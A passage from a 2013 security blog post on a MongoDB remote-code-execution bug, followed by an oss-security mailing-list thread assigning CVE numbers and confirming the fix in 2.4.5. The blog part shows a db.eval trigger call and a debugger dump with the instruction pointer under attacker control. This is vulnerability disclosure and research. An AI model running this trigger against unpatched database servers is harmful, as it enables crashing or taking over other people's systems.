can't map file memory - mongo requires 64 bit build for larger datasets
```

Finally, trigger the bug o/

```
> db.eval('Mongo.prototype.find("a",{"b":"c"},"d","e","f","g","h")');
```

With database filled with “a” you totally control stack :

```
Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xf360fb70 (LWP 12464)]
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x9161a60 --> 0x915e2e0 --> 0x1
ECX: 0xf7e633a0 --> 0x0
EDX: 0x5000000 --> 0x5000004 --> 0x855777c (mov esp,0x83ffd656)
ESI: 0x0
EDI: 0xf360dae0 --> 0x94a967c --> 0x61 ('a')
EBP: 0x61616161 --> 0x0
ESP: 0x83ffd65e ('a' <repeats 200 times>...)
EIP: 0x61616161 --> 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
 0x6161615b: add BYTE PTR [eax],al
 0x6161615d: add BYTE PTR [eax],al
 0x6161615f: add BYTE PTR [eax],al
=> 0x61616161: add BYTE PTR [eax],al
 0x61616163: add BYTE PTR [eax],al
 0x61616165: add BYTE PTR [eax],al
 0x61616167: add BYTE PTR [eax],al
 0x61616169: add BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0x83ffd65e ('a' <repeats 200 times>...)
0004| 0x83ffd662 ('a' <repeats 200 times>...)
0008| 0x83ffd666 ('a' <repeats 200 times>...)
0012| 0x83ffd66a ('a' <repeats 200 times>...)
0016| 0x83ffd66e ('a' <repeats 200 times>...)
0020| 0x83ffd672 ('a' <repeats 200 times>...)
0024| 0x83ffd676 ('a' <repeats 200 times>...)
0028| 0x83ffd67a ('a' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61616161 in ?? ()
```

I don’t think this exploit could be use in real life, but the POC is cool and the databaseSpray a funny feature !

## Not a 0day ?

After speaking directly to 10gen, here is the new timeline :

2013-05-20 Responsibly disclose (Production release 2.4.3) to ZDI
2013-05-28 10gen release v2.4.4
2013-05-30 ZDI Answer : “They already knew this bug, itâs not a vulnerability anymore in 2.4.4” – Close Case
2013-05-30 I responded that the vuln still exist…
2013-05-30 I wrote this article, exploiting v2.4.4
2013-06-05 10gen contact me : “ZDI never contacted us”

As @markofu said “So somewhere between the intermediary & 10gen, communication broke down :(“

10gen is now actively working on a patch.

I let you try it on unstable v2.5.0…

Thx for reading !

Posted on [June 4, 2013January 12, 2023](/2013/06/04/mongodb-rce-by-databasespraying/)Author [blogscrt](/author/blogscrt/)Categories [Vulnerability](/category/vulnerability/)

## Post navigation

[Previous Previous post: SCRT Security day : 13 Juin 2013 Ã  Chavannes de Bogis](/2013/05/22/scrt-security-day-13-juin-2013-a-chavannes-de-bogis/)
[Next Next post: Une Ã©quipe SCRT Ã  la BC Bike Race](/2013/06/27/une-equipe-scrt-a-la-bc-bike-race/)



=== Content from www.openwall.com_c845434f_20250125_191325.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](9) [[next>]](11) [[<thread-prev]](../../../2013/07/26/8) [[thread-next>]](../../../2013/08/07/8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAJojH49h5hF9JCC9dzABKRmXBz31P8V-vMZNXj=P-VEULuVU-g@mail.gmail.com>
Date: Tue, 30 Jul 2013 13:11:56 +0100
From: Andreas Nilsson <andreas.nilsson@...en.com>
To: kseifried@...hat.com
Cc: oss-security@...ts.openwall.com, Moritz Muehlenhoff <jmm@...ian.org>,
	Florian <floriangaultier@...il.com>, "A. Jesse Jiryu Davis" <jesse@...en.com>,
	"Steven M. Christey" <coley@...re.org>, Dan Pasette <dan@...en.com>
Subject: Re: CVE Request - MongoDB <=2.4.4 uninitialized object

Kurt,

Please let me clarify the CVE numbers involved and let me know if this
satisfies your concerns.

CVE-2013-2132 - Remote denial of server vulnerability in the
mongo-python-driver
(pymongo)
CVE-2013-3969 - RCE in MongoDB
<http://blog.scrt.ch/2013/06/04/mongodb-rce-by-databasespraying/> . This
issue is fixed as of version 2.4.5.
CVE-2013-4142 - This CVE should be recycled since it duplicates
CVE-2013-3969.

Thank you,
Andreas

On Fri, Jul 26, 2013 at 8:18 PM, Kurt Seifried <kseifried@...hat.com> wrote:

> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> On 07/18/2013 11:00 PM, Moritz Muehlenhoff wrote:
> > On Thu, Jul 18, 2013 at 08:14:39AM -0400, Dan Pasette wrote:
> >> We already requested CVE-2013-2132 for this and it was fixed in version
> >> 2.4.5.
> >>
> >> We announced it on mongodb-announce and have it listed in our alerts
> page
> >> here: <http://www.mongodb.org/about/alerts/>
> >
> > CVE-2013-2132 was already assigned to this issue in the Python driver:
> > <http://www.openwall.com/lists/oss-security/2013/05/31/6>
> > <https://jira.mongodb.org/browse/PYTHON-532>
> > <https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-2132>
> >
> > While "your" CVE-2013-2132 refers to
> > <https://jira.mongodb.org/browse/SERVER-9878>, which AFAICS is a different
> > issue.
> >
> > Cheers,
> >         Moritz
> >
>
> Can upstream please confirm/deny what is going on here, I'm pressed
> for time recently and don't have time to wade through the code to
> determine what's up, as I see it:
>
> 1) did a CVE number get recycled? E.g. you fixed the issue referred to
> in CVE-2013-4142 in mongodb but then label it with CVE-2013-2132?
>
> 2) are these in fact in need of a CVE merge? (seems unlikely since one
> is mongodb, and the other is the python driver, so different code bases)
>
> 3) some other option?
>
> I guess my biggest concern right now is confirming that CVE-2013-4142
> ( <http://blog.scrt.ch/2013/06/04/mongodb-rce-by-databasespraying/>) is
> in fact fixed in release 2.4.5 of mongoDB. Thanks!
>
> - --
> Kurt Seifried Red Hat Security Response Team (SRT)
> PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.4.13 (GNU/Linux)
>
> iQIcBAEBAgAGBQJR8sucAAoJEBYNRVNeJnmThyoP/1iLNar6Ebax4ini7ZsUIDOP
> fQVtXD0H5soEMmaqtgVLvmpobvCmcKdk1Yx6GbARgvCiR9aRxODRr6uUHTqWYo8l
> YkH7RHLXBNPfo31itzvF2psKkS0rcfhNw9eWIYkx7wbKd4eGSi64s/F8+A/Ewtql
> 7ZDo6lwxlmY8vEDaAo98Ts+Cavs0lF1EOFQ3z3nF6gDkZWKMER1R/WnZXnnop/j7
> kc5xVWifdHJWkJOJ90wlhthZmyp+YijAMKINScPBv+/tgCZT5OKBM+7+VJFGKJLg
> ZngwIcEkRRfqd/G9l+fQ1q6lMQPzKcFIIONeGSzIjxUay++uHBHUbxSS1A4YYwSW
> VoOj7IZZ5BG+UZfG/Z8fQunG074W+QHKI8mx9XnmuZnZA9zo4MJ8PdvaVxhQE+mL
> ACdOjBQQtHCyT46hOpPVE3RVXuFdzI3uDXaTN3YaWo63I03220vytr3gFkbT5Vv2
> 5+v2vE1wDQixXoH+92Y6fJkEoyk43s26BhEHrhvnKXzorxV7OUPvnIcOaWZR/JQA
> cdetu9duQa3Kn95x0GS4OU/qE9CJ6WC+gsO90SD4p/8B9/6eARVZ+DzUaw798eaP
> +X4SbvNu0+eUO85hMfGhDT3STrr8E7MzVTBYSn70QZduzA8FXpzM0p42h8KTbo8S
> Cyp09K0HbsPMTte1nuNN
> =qHRK
> -----END PGP SIGNATURE-----
>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


